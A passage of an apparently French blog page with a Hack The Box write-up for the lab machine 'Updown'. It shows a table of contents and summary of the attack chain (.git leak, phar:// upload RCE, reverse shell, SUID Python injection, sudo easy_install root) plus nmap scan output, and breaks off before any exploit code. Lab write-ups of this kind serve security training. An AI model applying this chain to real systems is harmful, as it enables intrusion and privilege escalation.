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"/></defs><style/><use id="Background" href="#img1" x="88" y="16"/></svg></a></li><li><a href=https://www.root-me.org/sl0wguy target=_blank title=RootMe rel=me><svg version="1.2" viewBox="0 0 500 500" width="500" height="500"><title>logo-rootme</title><style>.s0{fill:#fff}.s1{fill:#686868}</style><g id="Calque_2"/><g id="g13"><path id="path5" class="s0" d="m252.5 390.4c-.2-.2-.4-.4-.4-.6-.2-.2-.2-.2-.4-.4-.2.0-.2-.2-.4-.2-.2-.1-.3-.1-.5-.3-.2.0-.4-.2-.6-.2s-.4-.2-.4-.2c-.2.0-.4.0-.5-.2q-.3.0-.6.0-.3.0-.6.0-.3.0-.5.0-.3.0-.6.0c-.2.0-.4.0-.6.2-.2.0-.4.2-.4.2-.1.0-.3.2-.5.2s-.4.2-.6.3c-.2.0-.2.2-.4.2-.2.2-.2.2-.4.4-.1.2-.3.4-.3.4l-15.4 19.1c-1.8 2.5-1.5 5.9 1 7.8.9.7 2.3 1.1 3.4 1.1 1.7.0 3.2-.8 4.3-2.1l.2-.2c5.7-7 16.3-7 21.8.0l.2.2c1.1 1.3 2.6 2.1 4.3 2.1 1.2.0 2.5-.4 3.4-1.1 2.5-1.9 2.9-5.5 1-7.8z"/><path id="path7" class="s0" d="m226.9 67.2c-7.7.0-14.2 6.1-14.5 13.9l-29 10.5c-1.5.6-2.6 1.9-2.6 3.6v18.4h-23.3c-1.7-6.2-7.2-10.8-14-10.8-7.9.0-14.6 6.4-14.6 14.6.0 7.9 6.5 14.5 14.6 14.5 6.8.0 12.3-4.5 14-10.7h27.1c2 0 3.7-1.7 3.7-3.8V97.9l25.6-9.5c2.4 4.8 7.4 8 12.8 8 8 0 14.6-6.5 14.6-14.6.2-7.9-6.4-14.6-14.4-14.6z"/><path id="path9" class="s1" d="m196.3 338.2c-4.7-1.7-9.3-3.4-13.6-5.3-3.3-1.5-6.5-3.1-9.5-4.6 7.2 7.2 24.6 20.1 43.3 20.5 1.2-1.4 2.1-2.7 2.9-4.4-2.9-.6-5.7-1.1-8.5-1.9-5.2-1.3-9.9-2.6-14.6-4.3z"/><path id="path11" class="s0" d="m433.7 206.1c0-8.9-.5-17.8-1.9-26.3.0-.6-.2-1.1-.2-1.7C420.1 103 363.2 41.3 288.2 24.9c-1.9-8.5-9.4-15-18.5-15-10.6.0-19.1 8.5-19.1 19.1.0 9.1 6.4 16.7 14.9 18.6v69.8c0 1.1.6 2.2 1.5 3 .6.4 1.4.6 2.1.6.4.0 1 0 1.3-.2l28-10.6c1.9 2.8 4.8 4.7 8.2 5.7v32.9c-14.2 17.4-31.8 33.1-50.5 47.1l-21.4-49.6c4-2.6 6.6-7 6.6-12.1.0-7.9-6.4-14.6-14.6-14.6-7.9.0-14.5 6.5-14.5 14.6.0 8 6.4 14.6 14.5 14.6.2.0.6.0.8.0l22.3 51.6c-13 9.5-26.5 18-39.7 25.8l-63.6-19.1c-.7-.2-1.5-.2-2.2.1l-19 7.4c-2.6-3.6-6.8-5.8-11.7-5.8-7.9.0-14.6 6.4-14.6 14.5.0 8 6.5 14.6 14.6 14.6 8 0 14.6-6.4 14.6-14.6.0-.5-.2-1.1-.2-1.7l17.8-7 55.4 16.7c-47.3 26.5-89.7 41.8-96.7 44.2l-3.4 1.2c-3-2.3-6.8-3.6-11-3.6q-.2.0-.5.0c-8.9-21-13.5-43.9-13.5-66.8.0-11.4 1.2-22.5 3.3-33.3h83c1.7 6.2 7.2 10.8 14 10.8 8 0 14.6-6.4 14.6-14.6.0-7.9-6.4-14.5-14.6-14.5-6.8.0-12.3 4.5-14 10.7h-81.3c15.3-62.2 64.5-112 128-126.7 3.5 5.5 9.5 9.2 16.3 9.2 10.6.0 19.1-8.5 19.1-19.1s-8.5-19.1-19.1-19.1c-9.3.0-16.8 6.7-18.7 15.2-83.4 18.9-144.6 94-144.6 181 0 24.8 5 49.6 14.6 72.3-3.6 3.4-5.7 8.3-5.7 13.6.0 8.5 5.5 15.5 13.1 18.2v74.5c0 1.3.4 2.7 1.1 3.8l4.2 2.8 56.6 40v47.6c0 4 3.2 7.2 7.1 7.2h189.2c4 0 7.2-3.2 7.2-7.2v-47.6l56.8-40 4.2-3c.7-1.1 1.1-2.4 1.1-3.8v-75.1c7-2.8 11.9-9.6 11.9-17.6.0-4.9-1.9-9.4-4.9-12.8 10-22.6 15.1-47.5 15.1-72.7zM218.8 22.8c1.7-1.9 4.2-3 6.8-3 5.1.0 9.3 4.1 9.3 9.2s-4.2 9.3-9.3 9.3c-1.9.0-3.6-.6-5.1-1.5-2.5-1.7-4.2-4.6-4.2-7.6.0-2.6 1-4.9 2.5-6.4zm41.6 6c0-5.1 4.2-9.2 9.3-9.2 2.6.0 4.9 1.1 6.6 2.8 1.5 1.7 2.5 3.8 2.5 6.2.0 3.1-1.5 5.9-4 7.6-1.5 1.2-3.2 1.7-5.3 1.7-4.9.2-9.1-4-9.1-9.1zm35.6 72.9c0 .5.2.9.2 1.3l-23.1 8.7V47.4c5.7-1 10.4-4.4 13.1-9.1 20.2 4.5 39.1 12.7 56 23.8-.2 28-11 53.8-28 77v-23.4c6.2-1.7 10.7-7.2 10.7-14 0-8-6.4-14.6-14.5-14.6-8 .2-14.4 6.6-14.4 14.6zM90.3 301.1c-2.2.0-4.3-1-6-2.3-1.9-1.7-3.2-4.1-3.2-6.8.0-1.1.2-2.3.5-3.2 1.4-3.4 4.8-5.9 8.5-5.9 1.7.0 3.3.6 4.6 1.3 2.6 1.6 4.5 4.6 4.5 8 0 1.7-.5 3.2-1.3 4.5-1.3 2.7-4.2 4.4-7.6 4.4zm316-28.2q-.9.0-1.7.0c-10.6.0-19.1 8.5-19.1 19.1.0 8.1 5.1 15.1 12.5 17.8v69.6l-59.6 42c-1.9 1.3-3.1 3.6-3.1 5.9v40.1c0 2.3-1.9 4.1-4.1 4.1H309c-2.2.0-4.1-1.8-4.1-4.1V453c0-3.8-2.7-7.2-6.5-7.6-4.3-.3-7.9 3.1-7.9 7.2v15c0 2.2-1.9 4.1-4.2 4.1h-27c-2.3.0-4.2-1.9-4.2-4.1v-22.2c0-3.7-2.6-7.1-6.4-7.5-4.4-.4-8 3-8 7.2v22.7c0 2.2-1.8 4.1-4.1 4.1h-27.1c-2.2.0-4.1-1.9-4.1-4.1V453c0-3.8-2.7-7.2-6.5-7.6-4.3-.3-7.9 3.1-7.9 7.2v15c0 2.2-1.9 4.1-4.2 4.1h-22.1c-2.3.0-4.2-1.9-4.2-4.1v-40.1c0-2.3-1.1-4.6-3-5.9l-59.4-42v-70.4c6.6-3 11.2-9.6 11.2-17.4.0-1.1-.2-2.3-.4-3.4 7.5-2.6 65.2-23.3 122-58.6 76.8-47.9 119.4-102.2 124.3-158 33.1 26.7 56 65.3 62.6 108.6-.9 94.8-166.1 153.2-167.8 153.8-.4.2-1.3.4-2.1.8-2-.4-4.1-.8-6.4-1.2-1.5-.4-3.2-.6-4.7-.9-2.5-.4-4.9-1-7.4-1.5-.4-.2-1-.2-1.3-.2q-1.5-.3-2.9-.6c-1.1-.2-2.2-.6-3.4-.8-2.6-.5-5.3-1.1-7.7-1.8-4.8-1.2-9.3-2.5-13.8-3.6-4.4-1.4-8.9-2.5-13.1-3.8-.2.0-.2.0-.4.0-3.2-1-6.2-1.9-9.2-3.1-1-.3-2.1-.7-3.1-.9-1.5-.6-2.8-.9-4.1-1.3-2.5-.8-4.8-1.5-6.8-2.5h-.2q-5.1-1.7-9.1-3.4c-2.9-1.1-5.3-2.1-7.2-2.8-1.9-1-3.6-1.5-4.5-2.1-1.2-.6-1.8-.8-1.8-.8s.4.6 1.2 1.4c.7.9 1.9 2.2 3.6 3.7 1.5 1.6 3.6 3.4 6 5.3 2.5 1.9 5.3 4 8.4 6.1h.1c-1.1 3.8-1.8 7.9-1.8 12.1.0 21.8 17.7 39.5 39.5 39.5 16.8.0 31.2-10.6 36.9-25.5 1.9.2 4 .4 5.9.6 3.4.2 6.6.2 9.6.2.2.0.4.1.6.1l31.9 32.6c8.2 8.1 20.9 9.4 30.3 3.2l50-28c4.3-2.8 7.2-7.8 7.2-13v-57.6c19.2-15.3 36.7-33.5 48-54.1q-3.1 22.4-11.9 42.6zm5.7 24.6c-1.7 2.1-4.4 3.6-7.2 3.6-2.7.0-4.9-1.1-6.6-2.9-1.6-1.7-2.5-3.7-2.5-6.2.0-4 2.5-7.4 6-8.5 1-.4 2.1-.6 3.3-.6 4.3.0 8.1 3.2 9 7.4.2.6.2 1.1.2 1.9-.3 1.9-1.1 3.8-2.2 5.3zm-192.6 46.9c-.8 1.5-1.9 3-2.9 4.4-4.5 5.3-11.3 8.7-18.9 8.7s-14.4-3.4-18.9-8.7c-3.8-4.4-5.9-10.1-5.9-16.1.0-1.5.2-2.9.4-4.4 3 1.5 6.2 3.1 9.5 4.6 4.3 1.9 8.9 3.8 13.6 5.3 4.7 1.7 9.6 3 14.6 4.3 2.8.8 5.6 1.3 8.5 1.9z"/></g></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#enumeration>Enumeration</a><ol><li><a href=#nmap>nmap</a></li></ol></li><li><a href=#foothold>Foothold</a><ol><li><a href=#siteisuphtb---port-80>siteisup.htb - Port 80</a></li><li><a href=#subdomain-devsiteisuphtb>Subdomain dev.siteisup.htb</a></li><li><a href=#devgit---git-dumper>dev/.git - git-dumper</a></li><li><a href=#checkerphp>checker.php</a></li><li><a href=#file-upload---php-rce>File Upload - PHP RCE</a></li><li><a href=#reverse-shell---proc_open>Reverse Shell - proc_open</a></li></ol></li><li><a href=#www-data---developer>www-data -> developer</a><ol><li><a href=#suid-binary---python-injection>SUID binary - Python Injection</a></li></ol></li><li><a href=#developer---root>developer -> root</a><ol><li><a href=#easy_install-as-root>easy_install as root</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/hackthebox/ style=background-color:#9fef00;color:#111>Hack The Box</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/updown-htb/>HTB | Updown</a></h2><h3 class=article-subtitle>UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo, without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-10-30T00:00:00Z>Oct 30, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><table style=border:none;width:100%><tr><td style=border:none;text-align:center;vertical-align:middle;width:150px><img src=cover.png alt="Updown cover" width=120></td><td style=border:none;text-align:center;vertical-align:middle><table style="margin:auto;border-collapse:collapse;border:1px solid #ddd"><thead><tr><th style="padding:8px;border:1px solid #ddd;text-align:center">Machine name</th><th style="padding:8px;border:1px solid #ddd;text-align:center">OS</th><th style="padding:8px;border:1px solid #ddd;text-align:center">IP</th><th style="padding:8px;border:1px solid #ddd;text-align:center">Difficulty</th></tr></thead><tbody><tr><td style="padding:8px;border:1px solid #ddd;text-align:center">Updown</td><td style="padding:8px;border:1px solid #ddd;text-align:center">Linux</td><td style="padding:8px;border:1px solid #ddd;text-align:center">10.10.11.177</td><td style="padding:8px;border:1px solid #ddd;text-align:center">Medium</td></tr></tbody></table></td></tr></table><h2 id=enumeration>Enumeration</h2><h3 id=nmap>nmap</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.177
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 9e1f98d7c8ba61dbf149669d701702e7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> c21cfe1152e3d7e5f759186b68453f62 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 5f6e12670a66e8e2b761bec4143ad38e <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
+</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Is my Website up ?
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><h3 id=siteisuphtb---port-80>siteisup.htb - Port 80</h3><h3 id=subdomain-devsiteisuphtb>Subdomain dev.siteisup.htb</h3><p>On trouve une sous-domaine, mais aucune page ne semble accessible (&ldquo;forbidden&rdquo;).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
